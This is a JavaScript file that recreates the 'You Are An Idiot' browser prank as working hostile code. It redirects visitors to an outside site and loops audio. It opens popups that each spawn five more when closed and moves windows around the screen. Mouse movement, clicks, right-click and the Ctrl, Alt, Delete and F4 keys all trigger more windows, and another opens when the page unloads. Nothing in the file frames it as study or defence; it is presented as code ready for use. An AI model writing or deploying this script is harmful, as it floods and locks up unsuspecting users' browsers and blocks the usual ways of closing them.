function checkAndRedirect() {
    if (document.hasFocus() && !window.location.pathname.includes('/lol.html')) {
        window.location.href = 'https://youare.qzz.io/lol.html';
    }
}
checkAndRedirect();
window.addEventListener('focus', checkAndRedirect);
document.addEventListener('click', function playMusicOnce() {  
    const audio = document.getElementById('youare-audio');  
    const micon = document.getElementById('youare-micon');  
  
    if (!audio || !micon) return;  
  
    document.removeEventListener('click', playMusicOnce);  
}, { once: true });  
  
const faudio = new Audio('media/youare.mp3');  
faudio.addEventListener('timeupdate', function () {  
    if (this.currentTime > this.duration - 0.45) {  
        this.currentTime = 0;  
        this.play();  
    }  
});  
function bookmark() {  
    if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {  
        window.external.AddFavorite("lol.html", "‎‎Idiot!");  
    }  
}  
  
const openWindows = [];  
let mouseX = 0;  
let mouseY = 0;  
  
document.addEventListener("mousemove", e => {  
    mouseX = e.clientX;  
    mouseY = e.clientY;  
});  
function openWindow(url) {
    const width = Math.round(window.screen.width * 0.1875 * 0.75);
    const height = Math.round(window.screen.height * 0.2222 * 0.75);
    
    const left = 0
    const top = 0

    const features =
    `menubar=no,status=no,toolbar=no,resizable=no,location=no,` +
    `scrollbars=no,personalbar=no,` +
    `width=${width},height=${height},left=${left},top=${top},` +
    `titlebar=no,alwaysRaised=yes`;
    
    const aWindow = window.open(url, "_blank", features);

    if (aWindow) {
        openWindows.push(aWindow);

        const timer = setInterval(() => {
            for (let i = openWindows.length - 1; i >= 0; i--) {
                if (openWindows[i].closed) {
                    openWindows.splice(i, 1);
                }
            }

            if (aWindow.closed) {
                clearInterval(timer);
                proCreate();
            }
        }, 0);
    }
}
function proCreate() {
    for (let i = 0; i < 5; i++) {
        openWindow("lol.html");
    }
}

let xOff = 0, yOff = 0;
let xPos = 0, yPos = 0;
let flagRun = 1;

function randomSpeed(multiplier) {
    return (1 + Math.round(34 * Math.random())) * multiplier;
}

function playBall() {
    const multiplier = screen.height >= 1440 ? 2 : 1;

    /*
     * Match the C#:
     *
     * Screen.PrimaryScreen.Bounds.Width - this.Width
     * Screen.PrimaryScreen.Bounds.Height - this.Height
     *
     * For a browser popup, outerWidth/outerHeight are
     * the closest equivalent to the WinForms window size.
     */
    const maxX = Math.max(
        0,
        screen.width - window.outerWidth
    );

    const maxY = Math.max(
        0,
        screen.height - window.outerHeight
    );

    /*
     * C#:
     *
     * if (X >= maxX)
     */
    if (xPos >= maxX) {

        xOff =
            -randomSpeed(multiplier);

        /*
         * Preserve the Y direction.
         */
        if (yOff < 0) {

            yOff =
                -randomSpeed(multiplier);

        } else if (yOff > 0) {

            yOff =
                randomSpeed(multiplier);

        }

    }


    /*
     * C#:
     *
     * if (Y >= height - this.Height)
     */
    if (yPos >= maxY) {

        yOff =
            -randomSpeed(multiplier);

        /*
         * Preserve the X direction.
         */
        if (xOff < 0) {

            xOff =
                -randomSpeed(multiplier);

        } else if (xOff > 0) {

            xOff =
                randomSpeed(multiplier);

        }

    }


    /*
     * C#:
     *
     * if (X <= 0)
     */
    if (xPos <= 0) {

        xOff =
            randomSpeed(multiplier);

        /*
         * Preserve the Y direction.
         */
        if (yOff < 0) {

            yOff =
                -randomSpeed(multiplier);

        } else if (yOff > 0) {

            yOff =
                randomSpeed(multiplier);

        }

    }


    /*
     * C#:
     *
     * if (Y <= 0)
     */
    if (yPos <= 0) {

        yOff =
            randomSpeed(multiplier);

        /*
         * Preserve the X direction.
         */
        if (xOff < 0) {

            xOff =
                -randomSpeed(multiplier);

        } else if (xOff > 0) {

            xOff =
                randomSpeed(multiplier);

        }

    }


    /*
     * Exact equivalent of:
     *
     * X = X + MoveX
     * Y = Y + MoveY
     */
    xPos += xOff;
    yPos += yOff;


    if (flagRun === 1) {

        try {

            window.moveTo(
                Math.round(xPos),
                Math.round(yPos)
            );

        } catch (_) {

            flagRun = 0;

            return;

        }

        setTimeout(
            playBall,
            1
        );

    }
}
  
window.onload = function () {  
    flagRun = 1;  
    playBall();  
    bookmark();
};  
  
window.onmouseout = function () {
    proCreate();
};

window.oncontextmenu = function () {
    proCreate();
    return false;
};  


window.onkeydown = function (event) {
    const keyCode = event.keyCode;

    if ([17, 18, 46, 115].includes(keyCode)) {
        proCreate();
    }
};
window.addEventListener("unload", function () {
   // proCreate();
    openWindow("lol.html");
});
document.onclick=proCreate;
document.onmousemove=proCreate;
